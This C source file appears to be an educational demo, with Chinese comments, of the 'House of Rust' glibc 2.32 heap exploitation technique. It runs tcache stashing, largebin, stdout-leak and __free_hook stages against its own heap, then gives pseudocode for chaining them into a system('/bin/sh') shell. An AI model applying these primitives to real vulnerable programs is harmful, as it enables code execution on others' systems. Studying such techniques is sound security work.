/*
 * House of Rust 汇总演示，目标版本：glibc 2.32，x86-64。
 *
 * 这一个文件按原版利用顺序展示五个核心阶段：
 *   1. TSU+：把目标地址送进 tcache；
 *   2. TSU：再次利用 smallbin stashing 取得伪节点；
 *   3. 现代 largebin attack：把新 victim 的堆地址写到目标；
 *   4. stdout 字段覆盖：触发真实内存泄漏；
 *   5. __free_hook：演示原版 2.32 的最终控制流终点。
 *
 * 每个阶段都真实调用当前 glibc 的 malloc/calloc/free，并用 assert 检查结果。
 * 为了让代码能从上到下直接阅读，每个阶段放在一个独立子进程中。这样前一
 * 阶段故意留下的伪 smallbin/tcache 状态不会污染后一阶段；父进程只负责
 * 依次等待并检查五段是否都成功。
 *
 * 这仍然不是原作者约 65 次分配的题目级完整 exploit。原版会让上一阶段的
 * 输出直接成为下一阶段的输入，还依赖 WAF、低四位猜测、槽位生命周期和
 * 特定 Build ID。本文件的价值是：一次运行即可观察所有真实消费路径，文件
 * 末尾再用中文伪代码说明如何在题目中把五段重新接起来。
 */

#include <assert.h>
#include <malloc.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>

static int hook_called;

/* 这是第五阶段真正被 free 调用的最终控制流目标，不是普通辅助函数。 */
static void hook_target(void *pointer, const void *caller) {
  (void)pointer;
  (void)caller;
  hook_called = 1;
}

int main(void) {
  /*
   * 第一阶段：TSU+。
   *
   * 0x100 request 对应 0x110 物理 chunk。先用七次 free 填满 tcache，
   * 再让两个同尺寸 chunk 进入 unsorted，随后分类进 smallbin。
   */
  {
    pid_t child = fork();
    int status;

    assert(child != -1);
    if (child == 0) {
      __attribute__((aligned(16))) size_t target[4] = {0};
      size_t *chunk[9];
      size_t *result;

      for (int i = 0; i < 8; i++)
        chunk[i] = malloc(0x100);

      /* fence 阻止第八个 chunk 和后续区域合并。 */
      malloc(0x20);
      chunk[8] = malloc(0x100);
      malloc(0x20);

      /* 前七个进入 tcache，最后两个进入 unsorted。 */
      for (int i = 0; i < 9; i++)
        free(chunk[i]);

      /* 大申请不能使用 0x110 chunk，会把 unsorted 节点分类进 smallbin。 */
      malloc(0x200);

      /* 腾出两个 tcache 槽，给后面的 smallbin stashing 使用。 */
      malloc(0x100);
      malloc(0x100);

      /*
       * 漏洞模拟：chunk[8][1] 是已释放 chunk 的 bk。
       * 写成 target-0x10 后，glibc 会把 target 当成伪 chunk 的用户区。
       */
      chunk[8][1] = (size_t)target - 0x10;

      /* stashing 会写 fake->bk->fd，因此伪造的反向指针必须可写。 */
      target[1] = (size_t)target;

      /* calloc 进入旧 smallbin stashing 路径。 */
      calloc(1, 0x100);

      /* 下一次同尺寸 malloc 应返回栈上的 target。 */
      result = malloc(0x100);
      assert(result == target);
      write(STDOUT_FILENO, "[+] TSU+ 完成\n", sizeof("[+] TSU+ 完成\n") - 1);
      _exit(0);
    }

    assert(waitpid(child, &status, 0) == child);
    assert(WIFEXITED(status) && WEXITSTATUS(status) == 0);
  }

  /*
   * 第二阶段：标准 TSU。
   *
   * 使用 0x90 request，也就是 0xa0 物理 chunk。这个尺寸与第一阶段不同，
   * 所以第一阶段留下的 0x110 tcache 不会改变这里的分配顺序。
   */
  {
    pid_t child = fork();
    int status;

    assert(child != -1);
    if (child == 0) {
      __attribute__((aligned(16))) size_t fake[16] = {0};
      size_t *chunk[9] = {0};
      size_t *result;

      for (int i = 0; i < 9; i++)
        chunk[i] = malloc(0x90);

      /* 六次释放加 chunk[1] 的第七次释放，正好填满 tcache。 */
      for (int i = 3; i < 9; i++)
        free(chunk[i]);
      free(chunk[1]);

      /* tcache 已满，下面两个 chunk 会进入 unsorted。 */
      free(chunk[0]);
      free(chunk[2]);

      /* 0xb0 物理大小不能使用它们，因此把它们分类进 0xa0 smallbin。 */
      malloc(0xa0);

      /* 为 stashing 腾出两个 tcache 槽。 */
      malloc(0x90);
      malloc(0x90);

      /* fake[2] 是希望 malloc 返回的地址，fake[3] 对应伪节点的 bk。 */
      fake[3] = (size_t)&fake[2];

      /* 漏洞模拟：覆盖 smallbin victim 的 bk，使其指向 fake chunk。 */
      chunk[2][1] = (size_t)fake;

      calloc(1, 0x90);
      result = malloc(0x90);

      assert(result == &fake[2]);
      write(STDOUT_FILENO, "[+] TSU 完成\n", sizeof("[+] TSU 完成\n") - 1);
      _exit(0);
    }

    assert(waitpid(child, &status, 0) == child);
    assert(WIFEXITED(status) && WEXITSTATUS(status) == 0);
  }

  /*
   * 第三阶段：glibc 2.30～2.41 的现代 largebin attack。
   *
   * p1 的物理大小是 0x430，p2 是 0x420。p2 比当前 largebin 最小节点
   * p1 小，因此插入时会经过可利用的 bk_nextsize 更新分支。
   */
  {
    pid_t child = fork();
    int status;

    assert(child != -1);
    if (child == 0) {
      size_t target = 0;
      size_t *p1 = malloc(0x428);
      malloc(0x18);
      size_t *p2 = malloc(0x418);
      malloc(0x18);

      free(p1);

      /* 扫描 unsorted，把 p1 分类到 largebin。 */
      malloc(0x438);

      /* p2 暂时留在 unsorted，等待下一次扫描。 */
      free(p2);

      /*
       * p1[3] 就是 p1->bk_nextsize。
       * 插入 p2 时会写 bk_nextsize->fd_nextsize，而 fd_nextsize 位于
       * 伪 chunk 头的 +0x20，所以写入 target-0x20。
       */
      p1[3] = (size_t)&target - 0x20;

      malloc(0x438);

      /* 被写入的是 p2 的 chunk 头地址，而不是 p2 的用户区地址。 */
      assert(target == (size_t)(p2 - 2));
      write(STDOUT_FILENO, "[+] largebin 完成\n",
            sizeof("[+] largebin 完成\n") - 1);
      _exit(0);
    }

    assert(waitpid(child, &status, 0) == child);
    assert(WIFEXITED(status) && WEXITSTATUS(status) == 0);
  }

  /*
   * 第四阶段：stdout 泄漏。
   *
   * 原版 Rust 先借低四位猜测把一次写导向 _IO_2_1_stdout_。这里把“已经
   * 能覆盖 stdout 字段”作为输入，直接验证 glibc 的真实输出消费路径。
   */
  {
    pid_t child = fork();
    int status;

    assert(child != -1);
    if (child == 0) {
      static char secret[] = "[+] stdout 泄漏完成\n";

      assert(fflush(stdout) == 0);

      /* fflush 会输出 [write_base, write_ptr) 这段内存。 */
      stdout->_IO_write_base = secret;
      stdout->_IO_write_ptr = secret + sizeof(secret) - 1;
      stdout->_IO_write_end = secret + sizeof(secret) - 1;

      /* 保持 read_end 与 write_base 一致，避免先尝试调整文件偏移。 */
      stdout->_IO_read_end = secret;
      stdout->_IO_buf_base = secret;
      stdout->_IO_buf_end = secret + sizeof(secret) - 1;

      assert(fflush(stdout) == 0);
      _exit(0);
    }

    assert(waitpid(child, &status, 0) == child);
    assert(WIFEXITED(status) && WEXITSTATUS(status) == 0);
  }

  /*
   * 第五阶段：glibc 2.32 原版使用的 __free_hook 终点。
   *
   * stdout 已被故意破坏，因此后续成功信息使用 write 系统调用，不依赖
   * FILE 状态。glibc 2.34 起 free 不再消费 __free_hook，本文件不得在
   * 2.34+ 上被解释成可兼容的完整 House of Rust。
   */
  {
    pid_t child = fork();
    int status;

    assert(child != -1);
    if (child == 0) {
      void *chunk = malloc(0x30);

      __free_hook = hook_target;
      free(chunk);

      assert(hook_called == 1);
      write(STDOUT_FILENO, "[+] 汇总演示完成\n",
            sizeof("[+] 汇总演示完成\n") - 1);
      _exit(0);
    }

    assert(waitpid(child, &status, 0) == child);
    assert(WIFEXITED(status) && WEXITSTATUS(status) == 0);
  }

  _exit(0);
}

/*
 * ======================== 题目迁移伪代码 ========================
 *
 * 下列内容故意写在注释中，不能直接编译。它说明原版如何把上面五个已经
 * 验证的阶段接成同一条共享堆利用链，而不虚构一个跨题目通用 exploit。
 *
 * 题目原语：
 *     可以反复编辑已释放 chunk；
 *     可以建立约 65 次分配；
 *     最大 request 至少约 0x1b00；
 *     存在一次可触发的 stdout 输出；
 *
 * 伪代码：
 *     建立 14 个 0x90 class、15 个 0xa0 class、两组 largebin 和 fence；
 *     制造 WAF overlap，使 smallbin victim 的 bk/bk_nextsize 可编辑；
 *
 *     执行 TSU+；
 *     用第一次 largebin 写修复被 TSU+ 破坏的 fd；
 *     让 malloc 返回 tcache_perthread_struct 内部地址；
 *
 *     执行 TSU；
 *     用第二次 largebin 写在 tcache 元数据邻近位置留下 libc 指针；
 *     猜 libc 低四位，把该指针低字节改到 _IO_2_1_stdout_；
 *
 *     覆盖 stdout 的 read_end/write_base/write_ptr/buf_base/buf_end；
 *     触发题目的真实输出，取得完整 libc 泄漏；
 *
 *     重新计算 __free_hook 与 system；
 *     把 tcache 分配投递到 __free_hook，写入 system；
 *     申请并写入 "/bin/sh"，最后 free 该 chunk；
 *
 * 必查边界：
 *     glibc 2.33：组件和 hook 仍在，但原作者没有给出完整迁移证明；
 *     glibc 2.34～2.40：TSU/largebin 组件仍可研究，但必须替换 hook 终点；
 *     glibc 2.41：旧 smallbin stashing 路径被重构，原 TSU 组合失效；
 *     glibc 2.42：经典 largebin bk_nextsize 任意目标写再被加固。
 */
